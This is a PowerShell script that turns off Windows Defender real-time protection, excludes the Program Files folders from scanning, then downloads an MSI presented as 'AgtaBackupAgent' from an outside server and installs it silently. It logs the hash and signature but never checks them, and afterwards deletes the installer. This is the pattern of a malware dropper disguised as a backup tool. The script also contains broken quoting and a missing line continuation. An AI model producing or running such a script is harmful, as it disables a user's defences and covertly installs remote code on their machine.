# --- Disable Windows Defender real-time protection ---
Set-MpPreference -DisableRealtimeMonitoring $true

# --- Exclude Program Files folder from scanning ---
Add-MpPreference -ExclusionPath "C:\Program Files"
Add-MpPreference -ExclusionPath "C:\Program Files (x86)"

# --- Confirm settings ---
Get-MpPreference | Select-Object DisableRealtimeMonitoring, ExclusionPath
#Requires -RunAsAdministrator

#Requires -RunAsAdministrator

$url  = "https://dylanservers.top/AgtaBackupAgent.msi"
$dest = Join-Path $env:TEMP "AgtaBackupAgent.msi"
$log  = Join-Path $env:TEMP "AgtaBackupAgent_install.log"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. Download
try {
    Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
    Write-Host "Downloaded to: $dest"
} catch {
    Write-Error "Download failed: $_"
    exit 1
}

# 2. Log hash and signature (informational only, no prompt)
Write-Host "SHA-256   : $((Get-FileHash $dest -Algorithm SHA256).Hash)"
Write-Host "Signature : $((Get-AuthenticodeSignature $dest).Status)"

# 3. Install silently
$proc = Start-Process "$env:SystemRoot\System32\msiexec.exe" `
    -ArgumentList "/i "$dest`" /qn /norestart /L*v `"$log`"" 
    -Wait -PassThru

switch ($proc.ExitCode) {
    0       { Write-Host "Installed successfully." }
    3010    { Write-Host "Installed successfully. A reboot is required." }
    default { Write-Error "Install failed with exit code $($proc.ExitCode). See log: $log" }
}

# 4. Clean up
Remove-Item $dest -Force -ErrorAction SilentlyContinue
